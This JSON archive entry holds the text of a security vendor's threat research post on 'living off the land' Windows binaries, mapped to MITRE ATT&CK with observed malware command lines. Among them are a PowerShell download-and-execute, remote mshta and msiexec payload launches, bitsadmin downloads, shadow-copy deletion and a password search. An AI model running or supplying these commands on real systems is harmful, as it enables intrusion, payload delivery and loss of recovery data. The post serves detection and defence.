# 0-raw-data/ORKL/library/jsons_entries/7b4aaf97-ee2e-4b8c-ab8e-128fbd7b4f22.json
{
    "id": "7b4aaf97-ee2e-4b8c-ab8e-128fbd7b4f22",
    "created_at": "2023-01-12T14:59:28.45034Z",
    "updated_at": "2025-03-27T02:08:00.009394Z",
    "deleted_at": null,
    "sha1_hash": "f020101f4bae1f81b3ae5a944f66605b4baad069",
    "title": "2021-09-01 - LOLBins Are No Laughing Matter- How Attackers Operate Quietly",
    "authors": "",
    "file_creation_date": "2022-05-28T19:02:45Z",
    "file_modification_date": "2022-05-28T19:02:45Z",
    "file_size": 598835,
    "plain_text": "# LOLBins Are No Laughing Matter: How Attackers Operate Quietly\n\n**uptycs.com/blog/lolbins-are-no-laughing-matter**\n\n_Original research by Pritam Salunkhe and Shilpesh Trivedi_\n\nThe Uptycs Threat Research team has observed several malicious binaries in our threat intelligence systems using LOLBins in their\nattack kill chain. LOLBins (short form for Living Off the Land Binaries), are non-malicious native operating system or known software\nbinaries used for performing malicious activities and evading cyber defenses.\n\nThe Uptycs Threat research team has created over 300 rules covering different techniques used by LOLBins in the MITRE ATT&CK\nframework.\n\nIn this post, we’ll take a look at the LOLBins used by the attackers and how you can use Uptycs EDR detection capabilities to find if\nthese have been used in your environment.\n\nClick here to see the LOLBins MITRE map\n\n## LOLBins and Uptycs EDR coverage\n\nLiving off the Land binaries exploit the trusted utilities for achieving malicious objectives. They are mostly used by threat actors to\nstay under the radar and continue malicious activities undetected. In Windows, most of the malware families are taking leverage of\nLOLBins for a wide variety of phases in the attack kill chain.\n\n[Uptycs EDR has a robust coverage for all LOLBAS (Living off the Land Binaries and Scripts) techniques in the wild. Using the data](https://lolbas-project.github.io/)\nfrom our customer telemetry and threat intelligence systems, the Uptycs Threat research team has created over 300 rules covering 8\ndifferent tactics used by LOLBins in the MITRE ATT&CK framework. The distribution of these rules with the techniques is shown\nbelow (see Figure 1).\n\n\n-----\n\n## April - July 2021 LOLBins & MITRE ATT&CK Mapping\n\nUsing the data from our in-house threat intelligence systems and customer telemetry, we created a monitoring dashboard of all\nobserved LOLBins. From April 2021 through July 2021, we have observed 26 binaries mostly used as LOLBins by several malware\ngroups. The prevalence of the malicious binaries using the LOLBins is shown below (see Figure 2).\n\nThese LOLBins were identified to be exclusively used in the Defense Evasion and Execution phase of the MITRE ATT&CK\nframework. The distribution of the different ATT&CK tactics used by the attackers leveraging Windows utilities from April 2021\nthrough July 2021 is shown below (see Figure 3).\n\n\n-----\n\nThe table below describes these 26 LOLbins, along with their =MITRE ATT&CK mapping and a command line example.\n\n\nLOLBin MITRE\nID\n\n\nMITRE\nTactic\n\n\nDescription Command Line Example\n\n\nregsvr32.exe T1218 Defense\nEvasion\n\nrundll32.exe T1218 Defense\nEvasion\n\n\nAdversaries may\nuse regsvr32.exe\nto execute\nmalicious DLLs.\n\nAdversaries may\nuse rundll32.exe to\nload malicious\nDLLs.\n\n\nregsvr32 ..\\Kro.fis2\n\nrundll32 ..\\Kiod.hod2,DllRegisterServer\n\nEQNEDT32.EXE -Embedding\n\ncmd.exe /c reg add HKCU\\<Reg Key Path> /d 1q1a1z.bat /f\n\nPowerShell -c (New-Object\nSystem.Net.WebClient).DownloadFile('http://w2a0zj.pw/wnxtp2.exe',\n‘.\\morose.exe'); Start(‘.\\morose.exe’)\n\n\nEQNEDT32.exe T1203 Execution Adversaries may\nexploit CVE-201711882 vulnerability\nin eqnedt32 for\nremote code\nexecution in target\nsystem.\n\nCmd.exe T0159 Execution Adversaries may\nuse cmd.exe along\nwith /c or /k\nparameter to\nlaunch other\nWindows utilities\nfor further attack.\n\npowershell.exe T1059 Execution Adversaries may\nuse powershell.exe\nto download\npayloads or\nexecute malicious\nPowerShell-based\ntools or scripts.\n\n\n-----\n\nattrib.exe T1564 Defense\nEvasion\n\n\nAdversaries may\nuse attrib.exe to\nhide files for\ndefense evasion on\nthe target system.\n\n\nwmic T1047 Execution Adversaries may\nuse wmic for\nexecution or\nperforming lateral\nmovement in the\ntarget network.\n\n\nschtasks.exe T1053 Privilege\nEscalation\n\n\nAdversaries may\nabuse\nschtasks.exe utility\nto initiate execution\nor repeat execution\nof malicious code .\n\n\nnetsh T1546 Persistence Adversaries may\nuse netsh to gain\npersistence by\nexecuting helper\nDLL.\n\n\nChrome.exe T1105 Command\nand Control\n\n\nAdversaries can\nspawn chrome.exe\nto download\nmalicious files on\nthe target system.\n\n\nvssadmin.exe T1490 Impact Adversaries may\nuse vssadmin.exe\nto delete volume\nshadow copies to\nprevent system\nrecovery.\n\n\nnet.exe T1562 Defense\nEvasion\n\nmshta.exe T1218 Defense\nEvasion\n\n\nAdversaries can\nuse net.exe to stop\nservices on the\ntarget system.\n\nAdversaries may\nabuse mshta.exe to\nproxy execution of\nmalicious .hta files\nand Javascript or\nVBScript.\n\n\ncscript.exe T1059 Execution Adversaries may\nuse cscript.exe to\nexecute VB Scripts.\n\n\ncurl.exe T1105 Command\nand Control\n\n\nAdversaries may\nuse curl.exe to\ndownload tools and\npayloads from\nremote systems\ninto compromised\nsystems.\n\n\n\"C:\\Windows\\system32\\attrib.exe\" +h C:\\Users\\admin\\Pictures\\*.* /s\n\nwmic process call create \"rundll32.exe\nC:\\ProgramData\\lLjlxNACJC.dll CPGenRandom\"\n\nschtasks /run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I\n\nnetsh add helper C:/Users/Public/settingsync.dll\n\ncmd /k start chrome https://onedrive.live.com/embed?\ncid=880174EF88F116A9\n\nvssadmin.exe delete shadows /all /quiet\n\nC:\\Windows\\system32\\net.exe stop \"samss\" /y\n\nmshta https://median-researchers.000webhostapp.com/cmd.hta\n\n\"C:\\Windows\\System32\\cscript.exe\" //NOLOGO\n\".\\XMCO_Snap_Windows_v2.50.vbs\"\n\ncurl.exe -o C:\\ctf\\file.exe\nhttps://dforest.watch.impress.co.jp/library/7/7zip/11608/7z1900x64.exe\n\n\n-----\n\ncertutil.exe T1140 Defense\nEvasion\n\n\nAdversaries may\nuse certutil.exe to\nencode/decode\npayload to thwart\ndetections/analysis.\n\n\nwscript.exe T1059 Execution Adversaries may\nuse wscript.exe to\nto execute VBA,\nVBS, JS files.\n\n\nmsiexec.exe T1218 Defense\nEvasion\n\ncsc.exe T1027 Defense\nEvasion\n\nreg.exe T1112 Defense\nEvasion\n\nfindstr.exe T1552 Credential\nAccess\n\nbitsadmin.exe T1197 Defense\nEvasion\n\n\nAdversaries may\nuse msiexec.exe to\nsilently launch local\nor remote malicious\nMSI files.\n\nAdversaries may\nuse csc.exe tool to\ncompile\nexecutables from\ndownloaded C#\ncode.\n\nAdversaries may\nuse reg.exe to\nquery, add or\nmodify Windows\nregistry.\n\nAdversaries may\nsearch for\nunsecured\ncredentials which\nare stored in files in\nthe local system\nusing findstr.exe.\n\nAdversaries may\nabuse bitsadmin\n(Bits job) to\ndownload malicious\ncode\n\n\ncertutil -decode C:\\ProgramData\\googlelog.txt\nC:\\ProgramData\\edge.bat\n\nWScript.exe\" \"C:\\Users\\user\\Desktop\\2.vbs\"\n\nmsiExec /i http://hotelcontinental-khenifra.com/ffp/sa6t.msi /qn\n\n\"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\cimpactsc.exe\"\n/noconfig /fullpaths @\"2vdvx0yh.cmdline\"\n\nREG ADD\n\\\"HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\" /V\n\\\"Gom Player\\\" /t REG_SZ /F /D\n\\\"C:\\\\Users\\\\zinx\\\\AppData\\\\Local\\\\Gom Player.exe\n\nfindstr /spin \"password\" *.*\n\nbitsadmin.exe /transfer McbDBJxc\nhttps://jrsawesomebuilds.com/some/GHRPLA83D19D037U/doc.txt\nC:\\ProgramData\\doc.txt\n\ntaskkill /im explorer.exe /f\n\ncmd.exe /c whoami.exe /PRIV > file.txt\n\ntasklist /nh /fi \"imagename eq svhost.exe\n\n\ntaskkill.exe T1489 Impact Adversaries may\nuse taskkill.exe to\nkill processes or\nstop services.\n\nwhoami.exe T1033 Discovery Adversaries may\ntry to find current\nlogged in user or\nverify privileges of\nthe user using\nwhoami.exe.\n\ntasklist.exe T1057 Discovery Adversaries may\nuse tasklist.exe to\nenumerate running\nprocesses in the\ncompromised\nsystem.\n\n\n-----\n\nverclsid.exe T1218 Execution Adversaries may\nabuse verclsid.exe\nto execute\nmalicious COM\npayloads.\n\n## LOLBins Observations\n\n\nverclsid.exe /S /C {E88DCCE0-B7B3-11D1-A9F0-00AA0060FA31} /I\n{000214E6-0000-0000-C000-000000000046} /X 0x401\n\n\nBased on the data we obtained from April 2021 through July 2021, we identified the following:\n\nMost of the LOLBin alerts we have identified have been triggered via decoy macro documents.\n**regsvr32.exe and rundll32.exe have the highest number of counts as these utilities. These utilities were used exclusively by**\n[Qbot and IcedID malwares from the beginning of January 2021, as detailed in our previous blog.](https://www.uptycs.com/blog/icedid-campaign-spotted-being-spiced-with-excel-4-macros)\nWe have also seen a significant number of Loki and Agent Tesla malware samples exploiting a Microsoft Equation Editor (EE)\nvulnerability in the EQNEDT32.\n\nWe will now cover interesting examples of LOLBins and their corresponding MITRE ATT&CK tactics.\n\n## LOLBin - Chrome.exe\n\n Tactic: Command and Control\n\n_Hash: eae1b54ba4168e16e951fde291520078d8a5f8b98447cedf5663ae62b9069127_\n\nChrome is the most commonly used browser by most users even though it is not a defaut Windows utility. During June 2021, our\nthreat intelligence systems detected a document “Resume.docx '' which spawned a new process of chrome.exe via command line.\nThis activity often goes unnoticed by monitoring solutions.\n\nThe document used with chrome.exe to create a new window via command line argument ‘--new-window’ to download the payload\nfrom onedrive.com as shown below (see Figure 4).\n\n## LOLBin - Schtasks.exe\n\n Tactic: Privilege Escalation\n\n_Hash: 6c92ed33934d5a604f57aac4ff33252720354285291791bed88b6f3f15b9631d_\n\nSchtasks is used to create scheduled tasks which can be executed from time to time recurrently. We identified a document using\nschtasks for privilege escalation.\n\nThe Excel document we identified launches schtasks via command line to run the existing task named as SilentCleanup.This action\nis performed to bypass UAC and execute powershell commands in elevated mode as shown below (see Figure 5).\n\n## LOLBin - Csc.exe\n\n\n-----\n\n## Tactic: Defense Evasion\n\n_Hash: 2048aae014930d195ac0c139c3260928bd25d840ff924fb46d25c79048a9c813_\n\nCsc.exe is an inbuilt utility located in the Microsoft.NET\\Framework\\<Version> folder under the Windows directory. The main purpose\nof this utility is to compile C# code. As the malicious code isn't compiled, the adversaries may be able to bypass the detection and\nanalysis as it can also be named as legitimate looking documents.\n\nWe identified a word document named “contract.docm”, which launches powershell to download the uncompiled C# code. After\ndownload is complete, csc.exe compiles the same executable code on the fly as shown below (see Figure 6).\n\n## LOLBin - netsh.exe\n\n Tactic: Persistence\n\n_Hash: 36b891924e7259d7b517a5f16a108e63aca927da3610b1dcb4dee79a4ccd2223_\n\nNetsh is a command-line scripting utility that allows you to display or modify the network configuration. Netsh also has an option to\nadd helper DLLs to extend functionality of the utility.\n\nWe identified an excel document that called wmic to create a new process of netsh to register the malicious DLL as the helper DLL\nas shown below (see Figure 8).\n\nThe path of the DLL is also entered into Windows Registry at HKLM\\SOFTWARE\\Microsoft\\Netsh. This allows adversaries to\nmaintain persistence and the execution of the DLL would take place whenever netsh is launched.\n\n## Conclusion\n\nThe Uptycs Threat Research team continues to see an increase in the LOLBins used in various stages of the MITRE ATT&CK\nframework. As most of these utilities are often used for daily activities, it becomes a challenge for traditional security solutions that do\nnot monitor process behavior.\n\nUptycs’ EDR functionality with suspicious parent/child process relationships, correlation and Threat intelligence provides\ncomprehensive detection and visibility to identify and detect LOLBins malicious activity generically.\n\n**Credits: Thanks to our Uptycs Threat Research team member Rohit Bhagat for maintaining and making enhancements with the**\nthreat intelligence portal for identifying the latest LOLBins attacks.\n\n## To see more threat research check out the quarterly bulletin below.\n\n\n-----\n\nTag(s): [cloud security,](https://www.uptycs.com/blog/tag/cloud-security) [threat hunting](https://www.uptycs.com/blog/tag/threat-hunting)\n\n## Uptycs Threat Research\n\nResearch and updates from the Uptycs Threat Research team.\n\nConnect with the author\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-09-01 - LOLBins Are No Laughing Matter- How Attackers Operate Quietly.pdf"
    ],
    "report_names": [
        "2021-09-01 - LOLBins Are No Laughing Matter- How Attackers Operate Quietly.pdf"
    ],
    "threat_actors": [
        {
            "id": "b740943a-da51-4133-855b-df29822531ea",
            "created_at": "2022-10-25T15:50:23.604126Z",
            "updated_at": "2025-03-27T02:00:55.505366Z",
            "deleted_at": null,
            "main_name": "Equation",
            "aliases": [
                "Equation"
            ],
            "source_name": "MITRE:Equation",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535568,
    "ts_updated_at": 1743041280,
    "ts_creation_date": 1653764565,
    "ts_modification_date": 1653764565,
    "files": {
        "pdf": "https://archive.orkl.eu/f020101f4bae1f81b3ae5a944f66605b4baad069.pdf",
        "text": "https://archive.orkl.eu/f020101f4bae1f81b3ae5a944f66605b4baad069.txt",
        "img": "https://archive.orkl.eu/f020101f4bae1f81b3ae5a944f66605b4baad069.jpg"
    }
}